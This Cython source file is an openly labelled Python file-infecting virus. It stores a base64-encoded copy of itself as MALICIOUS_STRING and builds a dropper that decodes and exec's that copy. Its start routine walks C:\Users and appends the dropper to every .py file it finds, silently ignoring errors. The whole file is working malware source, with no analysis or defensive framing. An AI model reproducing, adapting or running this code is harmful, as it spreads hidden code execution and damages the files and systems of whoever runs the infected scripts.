from os import listdir,walk
from os.path import join as pjoin



cdef str MALICIOUS_STRING = "ZnJvbSBvcyBpbXBvcnQgbGlzdGRpcix3YWxrCmZyb20gb3MucGF0aCBpbXBvcnQgam9pbiBhcyBwam9pbgoKCgpNQUxJQ0lPVVNfU1RSSU5HID0gIiIKTUFMSUNJT1VTX0RST1BQRVIgPSBmImZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGVcbmV4ZWMoYjY0ZGVjb2RlKGIne01BTElDSU9VU19TVFJJTkd9JykuZGVjb2RlKCkpIgoKZGVmIGluZmVjdF9weV9maWxlKGZpbGVfcm9vdCk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcm9vdCwnYScpIGFzIGZpbGU6CiAgICAgICAgICAgIGZpbGUud3JpdGUoTUFMSUNJT1VTX0RST1BQRVIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwogICAgcmV0dXJuCgoKCmRlZiBtYWluKCk6CiAgICBmb3Igcm9vdCxkaXJzLGZpbGVzIGluIHdhbGsoIkM6XFxVc2VycyIpOgogICAgICAgIHRyeToKICAgICAgICAgICAgZm9yIGQgaW4gZGlyczoKICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIGxpc3RkaXIocGpvaW4ocm9vdCxkKSk6CiAgICAgICAgICAgICAgICAgICAgaWYgZmlsZS5lbmRzd2l0aCgnLnB5Jyk6CiAgICAgICAgICAgICAgICAgICAgICAgIGluZmVjdF9weV9maWxlKHBqb2luKHJvb3QsZmlsZSkpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwYXNzCgoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIG1haW4oKQo="
cdef str MALICIOUS_DROPPER = f"from base64 import b64decode\nexec(b64decode(b'{MALICIOUS_STRING}').decode())"

cpdef int infect_py_file(str file_root):
    try:
        with open(file_root,'a') as file:
            file.write(MALICIOUS_DROPPER)
    except Exception as e:
        pass
    return 0



cpdef int start():
    for root,dirs,files in walk("C:\\Users"):
        try:
            for d in dirs:
                for file in listdir(pjoin(root,d)):
                    if file.endswith('.py'):
                        infect_py_file(pjoin(root,file))
        except Exception as e:
            pass
    return 0

